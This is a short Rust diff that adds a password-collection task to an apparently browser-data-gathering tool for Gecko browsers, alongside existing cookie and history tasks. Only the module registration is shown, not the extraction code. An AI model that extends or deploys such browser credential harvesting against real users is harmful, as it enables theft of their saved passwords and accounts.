@@ -1,5 +1,6 @@
 mod cookies;
 mod history;
+mod passwords;
 
 use crate::gecko::cookies::CookiesTask;
 use crate::gecko::history::HistoryTask;
@@ -12,6 +13,7 @@ use filesystem::FileSystem;
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
 use tasks::{CompositeTask, Task, composite_task};
+use crate::gecko::passwords::PasswordTask;
 
 pub(crate) struct GeckoTask<'a, C: Collector, F: FileSystem> {
     tasks: Vec<(Arc<GeckoBrowserData<'a>>, CompositeTask<C, F>)>,
@@ -34,6 +36,7 @@ impl<C: Collector + 'static, F: FileSystem + 'static> Default for GeckoTask<'_, 
                 composite_task!(
                     CookiesTask::new(browser.clone()),
                     HistoryTask::new(browser.clone()),
+                    PasswordTask::new(browser.clone()),
                 ),
             ))
         }
